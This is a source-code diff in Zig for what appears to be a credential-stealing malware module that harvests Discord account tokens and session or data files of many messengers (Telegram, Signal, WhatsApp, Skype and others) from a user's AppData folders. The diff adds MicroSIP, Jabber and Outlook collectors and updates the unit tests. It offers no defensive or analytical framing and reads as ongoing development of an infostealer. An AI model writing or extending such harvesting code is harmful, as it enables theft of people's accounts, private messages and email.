@@ -11,9 +11,12 @@ const viber = @import("viber.zig");
 const element = @import("element.zig");
 const whatsapp = @import("whatsapp.zig");
 const icq = @import("icq.zig");
+const microsip = @import("microsip.zig");
+const jabber = @import("jabber.zig");
+const outlook = @import("outlook.zig");
 
 pub const MessengerData = struct {
-    discord_tokens: [][]const u8,
+    discord_accounts: []discord.DiscordAccount,
     telegram_files: [][]const u8,
     telegram_mod_files: [][]const u8,
     signal_files: [][]const u8,
@@ -26,6 +29,9 @@ pub const MessengerData = struct {
     element_files: [][]const u8,
     whatsapp_files: [][]const u8,
     icq_files: [][]const u8,
+    microsip_files: [][]const u8,
+    jabber_files: [][]const u8,
+    outlook_files: [][]const u8,
 };
 
 fn freeStrings(list: [][]const u8, allocator: std.mem.Allocator) void {
@@ -36,7 +42,7 @@ fn freeStrings(list: [][]const u8, allocator: std.mem.Allocator) void {
 pub fn collect(allocator: std.mem.Allocator, roaming_app_data: []const u8, local_app_data: []const u8) !MessengerData {
     const discord_path = try std.fs.path.join(allocator, &[_][]const u8{ roaming_app_data, "discord" });
     defer allocator.free(discord_path);
-    const discord_tokens = discord.collect(allocator, discord_path) catch try allocator.alloc([]const u8, 0);
+    const discord_accounts = discord.collect(allocator, discord_path) catch try allocator.alloc(discord.DiscordAccount, 0);
 
     const telegram_path = try std.fs.path.join(allocator, &[_][]const u8{ roaming_app_data, "Telegram Desktop" });
     defer allocator.free(telegram_path);
@@ -62,9 +68,12 @@ pub fn collect(allocator: std.mem.Allocator, roaming_app_data: []const u8, local
     const element_files = element.collect(allocator, roaming_app_data) catch try allocator.alloc([]const u8, 0);
     const whatsapp_files = whatsapp.collect(allocator, local_app_data) catch try allocator.alloc([]const u8, 0);
     const icq_files = icq.collect(allocator, roaming_app_data) catch try allocator.alloc([]const u8, 0);
+    const microsip_files = microsip.collect(allocator, roaming_app_data) catch try allocator.alloc([]const u8, 0);
+    const jabber_files = jabber.collect(allocator, roaming_app_data) catch try allocator.alloc([]const u8, 0);
+    const outlook_files = outlook.collect(allocator, local_app_data) catch try allocator.alloc([]const u8, 0);
 
     return MessengerData{
-        .discord_tokens = discord_tokens,
+        .discord_accounts = discord_accounts,
         .telegram_files = telegram_files,
         .telegram_mod_files = telegram_mod_files,
         .signal_files = signal_files,
@@ -77,13 +86,17 @@ pub fn collect(allocator: std.mem.Allocator, roaming_app_data: []const u8, local
         .element_files = element_files,
         .whatsapp_files = whatsapp_files,
         .icq_files = icq_files,
+        .microsip_files = microsip_files,
+        .jabber_files = jabber_files,
+        .outlook_files = outlook_files,
     };
 }
 
 test "collect returns empty result for nonexistent paths" {
     const result = try collect(std.testing.allocator, "C:\\__nonexistent__roaming", "C:\\__nonexistent__local");
     defer {
-        freeStrings(result.discord_tokens, std.testing.allocator);
+        for (result.discord_accounts) |*a| a.deinit(std.testing.allocator);
+        std.testing.allocator.free(result.discord_accounts);
         freeStrings(result.telegram_files, std.testing.allocator);
         freeStrings(result.telegram_mod_files, std.testing.allocator);
         freeStrings(result.signal_files, std.testing.allocator);
@@ -96,24 +109,41 @@ test "collect returns empty result for nonexistent paths" {
         freeStrings(result.element_files, std.testing.allocator);
         freeStrings(result.whatsapp_files, std.testing.allocator);
         freeStrings(result.icq_files, std.testing.allocator);
+        freeStrings(result.microsip_files, std.testing.allocator);
+        freeStrings(result.jabber_files, std.testing.allocator);
+        freeStrings(result.outlook_files, std.testing.allocator);
     }
-    try std.testing.expectEqual(@as(usize, 0), result.discord_tokens.len);
+    try std.testing.expectEqual(@as(usize, 0), result.discord_accounts.len);
     try std.testing.expectEqual(@as(usize, 0), result.telegram_files.len);
     try std.testing.expectEqual(@as(usize, 0), result.signal_files.len);
     try std.testing.expectEqual(@as(usize, 0), result.pidgin_accounts.len);
     try std.testing.expectEqual(@as(usize, 0), result.session_files.len);
     try std.testing.expectEqual(@as(usize, 0), result.tox_files.len);
     try std.testing.expectEqual(@as(usize, 0), result.icq_files.len);
+    try std.testing.expectEqual(@as(usize, 0), result.microsip_files.len);
+    try std.testing.expectEqual(@as(usize, 0), result.jabber_files.len);
+    try std.testing.expectEqual(@as(usize, 0), result.outlook_files.len);
 }
 
 test "MessengerData default is empty" {
     const md = MessengerData{
-        .discord_tokens = &.{}, .telegram_files = &.{}, .telegram_mod_files = &.{},
-        .signal_files = &.{}, .pidgin_accounts = &.{}, .pidgin_logs = &.{},
-        .session_files = &.{}, .tox_files = &.{}, .skype_files = &.{},
-        .viber_files = &.{}, .element_files = &.{}, .whatsapp_files = &.{},
+        .discord_accounts = &.{},
+        .telegram_files = &.{},
+        .telegram_mod_files = &.{},
+        .signal_files = &.{},
+        .pidgin_accounts = &.{},
+        .pidgin_logs = &.{},
+        .session_files = &.{},
+        .tox_files = &.{},
+        .skype_files = &.{},
+        .viber_files = &.{},
+        .element_files = &.{},
+        .whatsapp_files = &.{},
         .icq_files = &.{},
+        .microsip_files = &.{},
+        .jabber_files = &.{},
+        .outlook_files = &.{},
     };
-    try std.testing.expectEqual(@as(usize, 0), md.discord_tokens.len);
+    try std.testing.expectEqual(@as(usize, 0), md.discord_accounts.len);
     try std.testing.expectEqual(@as(usize, 0), md.session_files.len);
 }
